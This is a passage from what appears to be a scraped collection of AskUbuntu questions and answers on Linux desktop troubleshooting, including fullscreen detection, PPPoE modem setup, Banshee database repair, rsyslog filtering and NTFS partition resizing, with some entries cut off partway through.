/-geometry/ {print $4}')\n# Check if any window fills the screen\nxwininfo -root -tree | grep $root_geo | grep -qv \"\\(Desktop\\|has no name\\)\"\n\nIf there is any window that covers the whole screen, the last command will return exit code 0, otherwise 1. Note that this was devised on KDE Plasma as a desktop - you may need to adjust it for other desktop environments, see below.\nExplanation\nIt first obtains the measurements of the screen and saves it to root_geo. For single time-use, you can also inline that call.\nMultiple screens\nFor multiple screens, if both have the same resolution, you can either hard-code it or modify awk to do this calculation automatically (this assumes they are arranged horizontally):\nxwininfo -root | awk -F'[ +x]' '$3 ~ /-geometry/ {printf \"%dx%d\",$4/2,$5}'\n\nFurthermore, this should get the number of screens you have connected:\nxrandr | grep ' connected ' | wc -l\n\nSo, putting it together, this should work for any number of screens, as long as they are arranged horizontally without whitespace in between and have the same resolution (quite useful if you use a Laptop and regularly connect to external screens):\nroot_geo=$(xwininfo -root | awk -F'[ +x]' '$3 ~ /-geometry/ {printf \"%dx%d\",$4/'\"$(xrandr | grep ' connected ' | wc -l)\"',$5}')\n\nIf they have different resolutions or are arranged in a different way, you could also use xrandr to obtain the resolution for each and construct a regex that matches any of them. Note that this may falsely match on a window that matches the exact dimensions of another screen in a bigger one.\nYou could construct something that matches on the respective screen to remedy this, but I won't dig that deep here.\nChecking for fullscreen windows\nxwininfo -root -tree | grep $root_geo | grep -qv \"\\(Desktop\\|has no name\\)\"\n\nHere, you may have to adjust the last pattern.\nWhat this command does is list all existing windows, including your desktop, in a tree-like fashion. So after filtering for the ones that cover the whole screen, you also have to filter out the ones that are there anyways. The easiest way to check is to run the command without the last grep, which produced the following output for me (using KDE Plasma as desktop):\n❯ xwininfo -root -tree | grep $root_geo\n     0xe001cd (has no name): ()  1920x1080+1920+0  +1920+0\n        0xe001ce (has no name): ()  1920x1080+0+0  +1920+0\n           0x1e00180 \"Desktop — Plasma\": (\"plasmashell\" \"plasmashell\")  1920x1080+0+0  +1920+0\n     0xe0001e (has no name): ()  1920x1080+0+0  +0+0\n        0xe0001f (has no name): ()  1920x1080+0+0  +0+0\n           0x1e0000b \"Desktop — Plasma\": (\"plasmashell\" \"plasmashell\")  1920x1080+0+0  +0+0\n\nThus, grepping out Desktop and \"has no name\" (which seems to be a sort of grouping) was sufficient here.\n\nA: Kind of extreme overkill as a shell script, but it should do the trick:\n#!/bin/bash\nWINDOW=$(echo $(xwininfo -id $(xdotool getactivewindow) -stats | \\\n                egrep '(Width|Height):' | \\\n                awk '{print $NF}') | \\\n         sed -e 's/ /x/')\nSCREEN=$(xdpyinfo | grep -m1 dimensions | awk '{print $2}')\nif [ \"$WINDOW\" = \"$SCREEN\" ]; then\n    exit 0\nelse\n    exit 1\nfi\n\nThen you can check it:\nif is-full-screen ; then echo yup, full screen ; fi\n\nAs pointed out below, you'll need to install xdotool first:\nsudo apt-get install xdotool\n\n", "Q: Font style changed suddenly - what's wrong? /* to see the screenshots clearly please hit 'ctrl' and '+' */\nAfter installing Kubuntu 10.10 the look and feel was awesome.

You need to enable \"Use Primary (Selection)\" to enable copy-on-select.\n\nBoth applications can be configured to (not) save the clipboard on shutdown.\n\nUsing the keyboard\nIn the terminal, Ctrl + C sends a SIGINT kill signal to applications.\nThe default shortcuts in the Terminal are:\n\n\n*\n\n*Copy: Ctrl + Shift + C\n\n*Paste: Ctrl + Shift + V\nThese shortcuts can be customized in the Terminal application itself.\n\nA: In X you just have to mark the text you want to have copied and use the middle mouse button to paste it wherever you want.\n", "Q: How to connect Ethernet via a Huawei Smart AXMT880s modem (with auto-detection)? It's been well over six months but I have the same router SmartAX MT880d with Ethernet, and the exact same problem : no internet, even though I can successfully reach the modem settings page by entering 192.168.1.1 in Firefox.\nI'm a total beginner with Ubuntu. My internet works great in Windows but does not work in Ubuntu.\nSorry if I don't use the right (technical) terminology to explain my issue. English is not my mother tongue. \nFor 2 weeks, I've been doing reading on the web and forums and the ubuntuguide.org to name a few, but to no avail. Now I see no other solution but to ask for help.\nMy problem is that I can't find a way to put the right digits in the right place because I don't know what numbers I need to put in what files. E.g.: do I need to use DHCP? or a static IP address? No clue whatsoever. I'm concerned that I might put figures in the wrong spaces. For example, is the modem/router's IP exactly 192.168.1.1 for Huawei Smart AXMT880d modem? Is the subnet 255.255.255.0? Gateway 192.168.1.1?\nI'm confused as I can also see a different IP starting with 155131*** (is it an account number?) on my contract with Huawei (a Chinese ISP).\n\n\n*\n\n*Apart from calling 911, what other numbers do I need to put in and where?\n\n*How do I check that all the numbers have been entered correctly in every appropriate space before trying to connect the Internet?\n\n\n\nFurther development of the issue:\nFirst as per the post below, I successfully disabled IPv6 from article called \"Simple Way to Disable IPv6 in Windows Vista\". Then I tried connecting to the Internet in Ubuntu, to no avail again. \nThen I checked my settings in Ubuntu. I typed /etc/network/interfaces. There appears the loopback setting only, i.e.\nauto lo\niface lo inet loopback\n\nI also checked /etc/resolv.conf but it's empty.\nAt this stage, the network manager still does not detect anything even after having disabled IPv6.\nThen I tried Scaine's suggestion about pppoeconf coming from an article translated from Chinese. So I did the steps below and rebooted as the restart option (last step of the procedure below) has frozen for 2 minutes before i decided to reboot...(is that supposed to freeze at this stage??):\n\nBasically, from the article (I have obviously not tested this!):\n\nsudo apt-get install pppoeconf\n\nTo start the ADSL connection when\n  needed, in a terminal, sudo pon\n  dsl-provider To disconnect the ADSL\n  connection, you can enter in a\n  terminal, sudo poff If you need to\n  check the log, you can enter in a\n  terminal plog. Access to interface\n  information in a terminal type\n  ifconfig ppp0\nAfter using the pppoeconf if Network\n  Manager does not display hosted\n  solution:\nEnter the following command in a\n  terminal to configure a network\n  connection : sudo gedit\n  /etc/NetworkManager/nm-system-settings.conf\n  and change\n[ifupdown] managed = false\n\nto\n[ifupdown] managed = true \n\nThen in terminal run sudo gedit\n  /etc/network/interfaces and keep only\n  :\nauto lo\niface lo inet loopback\n\nDelete dns settings sudo mv\n  /etc/resolv.conf\n/etc/resolv.conf_backup\nFinally restart network-manager: sudo\n  service network-manager restart\n\n\nAfter that, the settings remained the same. That is, in /etc/network/interfaces, still the loopback settings, and /etc/resolv.conf is still empty.\nThen, I tried Simon Bridge's advice about pppoeconf (in post #8)\nI tried that pppoeconf before registering on AskUbuntu.com and after reading and trying everything in this thread (until 16th March 2011).\nMy view on the topic is that by having tested many things different tips one after the other, I may have mixed settings in the end.\nTO SUM UP NOW:\n\n\n*\n\n*IPv6 is disabled. In addition, in ipconfig /all in windows, I now noticed that DHCP is on for the Wireless LAN Adapter Wireless Network Connection, and Ethernet adapter Local Area Connection just shows the description of it: VIA VelocityFamily Gigabit Ethernet Adapter. That's it. The Ethernet is not \"on\" anymore. What should I do now??? Setting the IP address maybe???\n\n*As a result, DHCP is on in Windows (for the wireless) but still does not auto-detect anything yet (same thing for DHCP as a matter of fact. For the wireless, no detection although i can see the different wireless networks)\n\n*pppoeconf does not detect anything either after having done everything below.\n\n\nTherefore, I think there's a setting which has not been set correctly somewhere but where? That remains a question...Thx anyway to you all. If you have any suggestion...\nI'm grateful to you anyway.\n\nEdit:\nHi Scaine, here are some interesting results from pppoeconf! I think I'm about to succeed....but one more barrier below. Could you please help guide me again? What do I have to do to turn on that Internet connection? when I enter sudo pon dsl-provider, nothing (I can see) happens...\njoel@ubuntu:~$ sudo pppoeconf \n[sudo] password for joel:  \nPlugin rp-pppoe.so loaded. \nRP-PPPoE plugin version 3.8p compiled against pppd 2.4.5 \njoel@ubuntu:~$ plog \nMar 16 21:08:14 ubuntu pppd[1840]: Remote message: Authentication success,Welcome! \nMar 16 21:08:14 ubuntu pppd[1840]: PAP authentication succeeded \nMar 16 21:08:14 ubuntu pppd[1840]: peer from calling number 00:25:9E:F1:C1:9C authorized \nMar 16 21:08:14 ubuntu pppd[1840]: Cannot determine ethernet address for proxy ARP \nMar 16 21:08:14 ubuntu pppd[1840]: local  IP address 27.190.153.195 \nMar 16 21:08:14 ubuntu pppd[1840]: remote IP address 27.190.152.1 \nMar 16 21:08:14 ubuntu pppd[1840]: primary   DNS address 222.222.202.202 \nMar 16 21:08:14 ubuntu pppd[1840]: secondary DNS address 222.222.222.222 \njoel@ubuntu:~$ pon dsl-provider \nError: only members of the 'dip' group can use this command. \njoel@ubuntu:~$ sudo pon dsl-provider \nPlugin rp-pppoe.so loaded. \nRP-PPPoE plugin version 3.8p compiled against pppd 2.4.5 \n\n\nA: I'm adding a separate answer here, since while my first answer is relevant generally, it looks like the SmartAX MT880d modem/router requires a different approach.  I found this site which (with the help of Google Translate) outlines how to install ppoeconf and set up this modem under Ubuntu.\nBasically, from the article (I have obviously not tested this!):\nsudo apt-get install pppoeconf\n\nThen run the command with sudo pppoeconf, putting your account details in, as prompted.\nTo start the ADSL connection when needed, in a terminal, sudo pon dsl-provider\nTo disconnect the ADSL connection, you can enter in a terminal, sudo poff\nIf you need to check the log, you can enter in a terminal plog.\nAccess to interface information in a terminal type, ifconfig ppp0\nAfter using the pppoeconf if Network Manager does not display hosted solution: \nEnter the following command in a terminal to configure a network connection:\ngksu gedit /etc/NetworkManager/nm-system-settings.conf\n\nAnd change\n[ifupdown] managed = false\n\nto:\n[ifupdown] managed = true \n\nThen in terminal run gksu gedit /etc/network/interfaces and keep only: \nauto lo iface lo inet loopback\n\nDelete DNS settings: sudo mv /etc/resolv.conf /etc/resolv.conf_backup\nFinally restart network-manager: sudo service network-manager restart (Or reboot!)\n\nA: If your PC works with this modem in Windows, it should be quite easy to copy those settings to Ubuntu.  In Windows, open a command window and type ipconfig /all.\n\nIn this screenshot above, you can see that DHCP is not enabled, so in this case, I'd have to copy the settings down, in particular, IP Address, Subnet Mask, Default Gateway and DNS Servers.\nThen in Ubuntu, we need to replicate those settings in Network Manager.  So right click on the network manager applet, choose \"Edit Connections\", then edit your \"Auto eth0\" connection to match what you saw in Windows.\n\nIf DHCP was enabled, then Ubuntu should simply work, since that's its default setting.\n\nA: I'm excited. I got it working...\nI knew I would do it...ahahahah\nThanks to everyone! \nAfter having deactivated IPv6 in Windows following this tutorial for Vista, Scaine helped a great deal when they led me to type sudo pppoeconf. Then I entered the username and password shown on my Internet contract and always said \"yes\" when prompted. I then proceeded to run the plog command as you can see above in my terminal with that error message:\nMar 16 21:08:14 ubuntu pppd[1840]: Cannot determine ethernet address for proxy ARP\n\nLooking for that error in Google, I ran into this post on justlinux.\nAs suggested by that link, I entered:\nsudo -H gedit /etc/ppp/options\n\n[editor's note - added the -H flag]\nand just disabled an option:\nI changed it from noauth to #noauth. That is I just deactivated this option by adding # before noauth. I saved, used the plog command again in the terminal again without sudo, and went straight online.\nI hope this post helps somebody else as much as you have all helped me.

I used to use banshee everyday and it worked perfectly.\nCan anyone help me fix this? \n\nA: This problem is, unfortunately, not completely uncommon.  It's often caused by a system crash or power outage while Banshee is running, but there may be other causes as well.  The Banshee FAQ page has a list of instructions that work most of the time.  In terminal, with the sqlite3 program installed, try this:\nChange into the directory where Banshee stores the database:\ncd ~/.config/banshee-1\n\nExecute the \".dump\" command on the database, which will convert all tables to text. Save this output in a file named dump.

If you want to stay up-to-date on the progress, feel free to CC yourself to the bug report.\n\nA: It looks like Banshee's database has become corrupt. To make Banshee run, you should remove the corrupt database file (or repair it). The database is located at\n~/.config/banshee-1/banshee.db\n\nRename it, and Banshee can run again. But all your settings are lost. If you'd like to recover it, follow this article.\nThat consists of:\n\n\n*\n\n*Open a terminal window and navigate to ~/.config/banshee-1 and install sqlite3: sudo apt-get install sqlite3\n\n*Backup the file banshee.db by copying it.\n\n*Open the database file using sqlite3: sqlite3 banshee.db\n\n*Do an integrity check by issuing the command PRAGMA integrity_check;. This reports errors, but does not correct those\n\n*Try the command REINDEX;\nIf none of the above worked, continue reading Recovering a Corrupted Banshee Database.\n", "Q: How do I use virtualbox for Windows 7 installer?

Alternatively you can also boot from the original boot CD/DVD using the host drive.\nThere are two rather complicated methods to still boot Virtual Box from an USB stick:\n\n\n*\n\n*Boot from another OS's bootloader that then allows booting from USB (PLOP Linux method as explained in a thread on Virtual Box support forum)\n\n*define your USB-stick as a virtual box .vmdk hard drive (see this blog for details)\n\n\nHowever both methods are not recommended for an installation of a virtual OS.\n\nA: Create a empty disk for Windows7 and then F12 during post for bootmenu?\n(I'm not able to test it for myself)\n\nA: You can convert your USB device to Virtualbox-compatible disk image like this:\nVBoxManage convertfromraw /dev/sdxy ~/image.vhd --format VHD\n\n\nA: you can use \"imgburn\" under windows (free app), open as admin, select create image from files / folders, then click on advanced tab, there you will see \"make bootable\" check-mark box, from there you can select boot image \nwhen i tried to extract the boot image from my 32gb usb flash win 7 pro sp1 installer, it started to capture entire disk (it works normally from cd's/dvd's typically creating 2mb bootimage.bin file), you can try renaming entire image to either .iso or .img and see if it works that way (didn't have time to check), but normally you would select boot image and just so happens it should be on your usb stick located in /efi/microsoft/boot/ there 2 .bin files you can choose, if you'll have issues using those try the .bin file under /boot/\nby imgburn you can create iso's from cd's/dvd's, then edit them to suit your needs, ie some cusom config, additional wallpapers, etc, then put it back together\nalso if you have original iso you used to create you usb installer you can extract boot image from it, but you might have to burn it to a dvd first (i don't remeber), so play around with it and post feedback\nmike\n", "Q: How can I prevent [flush-8:16] and [jbd2/sdb2-8] from causing GUI unresponsiveness?

The client/guest will have to provide credentials that the server can validate, but everything works with preserved permissions (share and folder) then on.\nOn the main menu in Ubuntu, select Places/Connect to Server/Windows share, and the logged-in user will gain whatever access the provided credentials allow. Permanently mounting the share requires that the user credentials be exposed in /ect/fstab, and be the same for all users, so skip that.\nLastly smbfs may be able to mount the share with the correct user permissions, but I haven't tried/needed it.\n", "Q: Can I install Debian Unstable Scala 2.8.1 package in Ubuntu? Won't it cause problems? I am coding Scala and would like an up-to-date 2.8.1 of it to be installed in my Ubuntu 10.10 system, but there is only obsolete 2.7 package available in Ubuntu repositories, so I have to go Slackware-way and use manual installation from tarballs. At the same time there is already scala_2.8.1.dfsg-1_all.deb available for Debian. Can't I just install it in Ubuntu?\n\nA: You could use the jar installer as follows:\nFirst download the IzPack Installer from the Scala Website, http://www.scala-lang.org/downloads.\nRun it with \nsudo java -jar installer.jar \nand use the default folder /usr/local/scala for the installation \n(where for me it was sudo java -jar scala-2.8.1.final-installer.jar).\nThen edit /etc/environment so PATH is as follows\nPATH=\"... :/usr/local/scala/bin\"\nand add\nSCALA_HOME=/usr/local/scala\nNow logout and login again. \n\nA: Provided the dependencies are satisfiable, this should generally work.\nSince this package probably has only been tested on Debian and not on Ubuntu there is a higher risk that e.g. it doesn't declare all the necessary dependencies or is incompatible with some change in Ubuntu.\n", "Q: Why do the same Wine applications appear in applications list many times? How to fix this? Why are there 4 IEs (I have not installed them manually, may be one, but not four), 2 WordPads, 2 \"winebrowsers\" (and 2 notepads there up the list)? Do you know how fix this correctly?\n\n\nA: *\n\n*Launch Menu editor from the dash.\n\n\n\n\n\n*\n\n*Go to the Other Category.\n\n\n\n\n\n*\n\n*Remove all the useless or duplicated shortcuts.\n\n\n\n\n\n*\n\n*Done!\n\n", "Q: PPA & Packaging: Packaging Source as a Binary Package I'm trying to create a .deb for a python-based IRC bot.  I've already gone through the Ubuntu Packaging Guide, and done a debuild -S on it to create the source package.\nWhen its uploaded to the PPA, it fails to include the code for the bot (which is necessary for the bot to run).  How do I make the .deb so that it (a) isnt a source package, and (b) includes the code for the bot so that it can be run?\nEdit\nAnd by \"includes the code for the bot so that it can be run\", I mean so that the .deb extracts the code to the location in the virtual file structure that I specified so that it can be used by any user.  Note that because its a python bot, there's no single executable file in the code, which explains the need for the source to be packaged and extracted with the .deb\n\nA: First of all, assuming your package is named ircbot, create a file named ircbot.install in the debian folder. This file contains instructions for the installer to copy certain files to their destination in the virtual filesystem you are referring to.\nFrom there, it's simply a matter of adding the names of the files you want copied.\nSo, if you have a file bot.py that goes to /usr/share/ircbot/bot.py, you would add a line to ircbot.install like so:\nbot.py usr/share/ircbot\n\n\nA: Create an \"install\" file in the \"debian\" folder, like this:\nlocal_file /system/path/where/to/copy/file\nlocal_file2 /system/path/where/to/copy/file2\n.... add as many files/folders as you want\n\nThen, installing the .deb will only move the files to the right folders.\n", "Q: What does “%U” mean when calling a command? When editing the Applications menu, I see for some applications their commands have %U such as gedit %U and gnome-mplayer  %U, but others don't such as gcalctool.\nI was wondering what %U means when calling a command, and when it is needed and when it is not? Thanks!\nThis is motivated from my previous question, where I followed a reply but did not make it work.\n\nA: It's a parameter for the Exec key in .desktop files (defined in the Desktop Entry Specification) that describes how arguments to the program (from the file manager/program launcher, e.g. multiple selected files) should be handled:\n\n%u  A single URL. Local files may either be passed as file: URLs or as file path.\n%U  A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.\n\nSo, e.g., /usr/share/applications/gedit.desktop contains:\n\nExec=gedit %U\n\nwhich means that arguments to gedit will be treated as a list of URLs (or local files).\nFor a complete list of possible parameters, see The Exec key.\n", "Q: Can I block log messages from specific devices or drivers? I'm getting \"NVRM: os_raise_smp_barrier()\" messages in syslog and dmesg at a rate of 4-6 per minute; I think it's from the Nvidia graphics driver.\nThe system behaves normally, but the messages clutter up the logs so I can't find any real issues. (At the moment dmesg is 4,000 lines and 3,925 of those lines are the same message.)\nIs it possible to suppress or redirect these messages?\nExample log snippet:\nMar 13 20:38:04 desktop kernel: [175481.413559] NVRM: os_raise_smp_barrier(), invalid context!\nMar 13 20:38:04 desktop kernel: [175481.430904] NVRM: os_raise_smp_barrier(), invalid context!\nMar 13 20:38:45 desktop kernel: [175522.223337] NVRM: os_raise_smp_barrier(), invalid context!\nMar 13 20:38:45 desktop kernel: [175522.239655] NVRM: os_raise_smp_barrier(), invalid context!\nMar 13 20:38:47 desktop kernel: [175523.556706] NVRM: os_raise_smp_barrier(), invalid context!\nMar 13 20:38:47 desktop kernel: [175523.572015] NVRM: os_raise_smp_barrier(), invalid context!\n\n\nA: I have half an answer: I don't know how to block specific drivers, but rsyslog has a mechanism for filtering log messages on content:\nEdit the rsyslog configuration file:\nsudo nano /etc/rsyslog.d/50-default.conf\n\nAdd a text filter at the top of the file, and redirect the messages matching the filter to a separate log:\n:msg, contains, \"NVRM: os_raise_smp_barrier\" -/var/log/junk.log\n& ~\n\nSave the file and restart rsyslog:\nsudo service rsyslog restart\n\nCheck that the restart worked:\n$ tail /var/log/syslog\n...\nMar 14 10:38:35 desktop kernel: Kernel logging (proc) stopped.\nMar 14 10:38:35 desktop kernel: imklog 4.2.0, log source = /proc/kmsg started.\nMar 14 10:38:35 desktop rsyslogd: [origin software=\"rsyslogd\" swVersion=\"4.2.0\" x-pid=\"18494\" x-info=\"http://www.rsyslog.com\"] (re)start\nMar 14 10:38:35 desktop rsyslogd: rsyslogd's groupid changed to 103\nMar 14 10:38:35 desktop rsyslogd: rsyslogd's userid changed to 101\n\nAnd /var/log should now contain a new log file junk.log containing the filtered messages.    \nSo far so good, the only drawback is that it doesn't work for dmesg.\n", "Q: How can I resize an external USB NTFS partition? I have a new USB drive which came with a single NTFS partition.\nHow can I shrink that so that I can create an ext4 partition?\ngparted does not seem to have the \"Resize\" option highlighted.\nUpdate:\nAfter following the directions below, after unmounting I am still not able to resize the partition.  There is a warning though:\n\nUnable to find mount point.  Unable to read the contents of this file system! Because of this, some operations may be unavailable. The following list of software packages is required for ntfs file system support: ntfsprogs\".\n\nHowever, with the partition mounted, I can read & write to the file system on the drive just fine, and ntfsprogs is installed and current. \nWhat's next?\n\nA: You will not be able to resize the drive while it is mounted ie: in use - boot into Gparted Live CD, attach the drive (make sure it is not mounted!!) and then you should be able to resize the drive as you want.\nHere is some useful documentation on using Gparted: http://www.dedoimedo.com/computers/gparted.html\n\n\nA: Using gparted, you should start by right-clicking and choosing \"Unmount\".  This will allow you to edit the partition.\nYou should then be able to use the resize command as well as be able to make new partitions on the USB drive, and should allow you to create an ext4 partition alongside the NTFS partition.\n\nA: Unmounting an external USB drive for partitioning\nFrom a running Ubuntu (no need to boot from a live CD) you need to unmount the external USB drive using a terminal with the following command:\nsudo umount \"/media/External USB\"\n\nMind that the mountpoint \"/media/External USB\" is different on your system and depends of the name you gave your drive. If you are not sure the mountpoint of your external drive is shown in System -> Administration -> Disk Utility, or with the command mount -l in a terminal.\nGParted or Nautilus will not let you unmount the drive without removing the USB drive as well.\nOnce the drive is unmounted you can resize or reformat your partitions with GParted or any other partitioning tool.\n\nA: You'll need to unmount it first, probably best achieved through Nautilus, and then you can open GParted and resize the partition.\n\nA: Here's my experience...your mileage may vary.\nI had an external USB HD, primarily used for massive backups.  But when I plugged it in, two logical drives appeared:  this annoyed me.  They were formatted ntfs. \nWhen I ran Gparted from the Ubuntu menu, I could click on \"Unmount,\" but it wouldn't do it.  Forget all the \"whys\"...bottom line: Gparted would not unmount the partition...which meant I couldn't reformat, resize, etc. So...\nFrom a terminal I ran  mount -l and saw that the drive was mounted at /dev/sdc1\nFrom the terminal I typed sudo umount /dev/sdc1\nAfter this, I could use the Gparted utility from the Ubuntu menu to delete the partition, reformat etc.\nFor the record, I tried unmounting with Nautilus: didn't work. Then the drive didn't show up on Gparted at all!\nHope this helps/works for you.\n\nA: run chkdsk /f on windows before resizing in ubuntu. If there are unresolved errors on the filesystem, resize option does not work.\n\nA: I disagree with the comments that you need to perform this operation on a Live CD. You're talking about an external USB drive, not a system drive. You definitely can do this operation from your installed system.\nIf gparted is reporting this error, you might have something wrong with the ntfs partition. You should probably run sudo ntfsresize --info /dev/sdX1 on your partition. This tool (it's used by gparted itself to do the resize) will report if there's something wrong with your ntfs partition that should be fixed with chkdsk /f on Windows.\n\nA: Or you can use gnome-disk-utility found in Administration > Disk Utility. It will list your usb in storage device. \n", "Q: When will postgres 9 be supported? When will Ubuntu support postgres 9? \n\nA: Ubuntu 11.04 currently has 8.4.7 and I don't expect that to be changed. Debian testing has Postgres 9.0.3 so I'd expect it to be in Ubuntu 11.10.\n\nA: The debian- and ubuntu-maintainer Martin Pitt has very stable backports from Lucid (10.04) on.\nhttps://launchpad.net/~pitti/+archive/postgresql\n\nA: Check out http://wiki.postgresql.org/wiki/Apt for 'official' packages for Ubuntu.\n", "Q: External hard drive gets wrong user as owner When I attach my external hard drive, I cannot access it, because permissions are granted not to me but to another user. \nI'm using Ubuntu 10.10, Maverick Meerkat.\n\n\n*\n\n*Where do I report this as a bug? \n1b. Is it a Ubuntu, or a Nautilus, or a Gnome problem?\n\n*Is there a solution for this problem?\nAny help will be appreciated!\n\nA: It isn't a bug.  Either you have added an incorrect entry to your /etc/fstab, or you are mounting a filesystem that stores permissions and was created on another machine, and so the ownership information is not correct on yours.  If the former, then you need to chown the files to fix it, but this will of course, cause the same problem if you take the drive back to the other machine.\nIf you plan on moving the drive back and forth between machines, then you should use fat or ntfs.  UDF is also an option if you don't mind incompatibility with Windows since it refuses to mount a UDF filesystem on anything but optical media.\n", "Q: How to disable the alt-hotkey behavior on gnome terminal? This is not just gnome terminal, but pretty much all gnome windows: When you hold the \"alt\" key, you can press the first letter of one of the menu items. This will let you scroll that menu without clicking on it directly.\nThis is okay on any other window, like say Firefox, but on gnome terminal, it steals the keys I use for emacs!! There is very little chance of me learning a new set key combinations if I can avoid.\nIf I can't isolate this just to gnome terminal, I'm fine with that.\n\nA: Edit > Keyboard Shortcuts..., and uncheck \"Enable menu access keys\".\n\nA: For Gnome terminal 3.14.1: Click Edit (on menu bar) > Preferences > At last on \"General\" tab, Un-check \"enable mnemonics...\" .\n\nA: In Ubuntu 16.04, go to System Settings -> Keyboard -> Shortcuts -> Launchers, and clear the Key to show the HUD (or change it to another key)\n\nA: If you want to do it globally, you can try this method (source):\n\nTo disable mnemonics you should create (if it doesn't already exist) ~/.gtkrc-2.0. \n  This file should contain the line gtk-enable-mnemonics = 0 (you can\n  add other GTK settings if you'd like). Then, restart for the changes\n  to take effect (you may be able to log out then log in instead).\nThe alt key will still make menus appear in some cases, but the\n  mnemonics are now disabled. Hoorah!\n\nEDIT: this method no longer works. I filed a bug report regarding the OP's question so we'll see how it evolves.\n\nA: This is really driving me crazy too.  I'd like to use Alt-V for paste as it is much more ergonomic than using CTRL but this doesn't seem possible because of the View menu option.  \nOverall this seems like a bug because when I disable the hotkeys in Preferences I am no longer able to use Alt-V for accessing the View menu but I am also not able to use that combination for other things. \nI was able to get Alt-Z to work because there is no menu beginning with Z.  \n"]
